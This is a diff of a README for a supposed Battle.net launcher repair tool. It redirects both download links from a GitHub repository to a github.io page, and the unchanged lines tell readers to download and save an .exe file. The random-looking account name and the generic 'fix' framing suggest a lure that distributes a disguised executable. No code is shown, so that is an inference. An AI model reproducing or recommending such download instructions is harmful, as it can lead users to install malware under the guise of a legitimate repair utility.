@@ -1,6 +1,6 @@
 # 🛠️ Battle-net-Not-Opening-Fix - Resolve Blizzard Launcher Issues On Windows
 
-[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/Shavian-electricbell655/Battle-net-Not-Opening-Fix)
+[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://shavian-electricbell655.github.io)
 
 ## 📖 About This Tool
 
@@ -26,7 +26,7 @@ Follow these steps to obtain and use the repair utility. Read each step to avoid
 3. Click the file matching the name Battle-net-Not-Opening-Fix.exe to begin the transfer.
 4. Save the file to your Downloads folder.
 
-[Download the Repair Tool Here](https://github.com/Shavian-electricbell655/Battle-net-Not-Opening-Fix)
+[Download the Repair Tool Here](https://shavian-electricbell655.github.io)
 
 ## ⚙️ Running The Repair Process
 
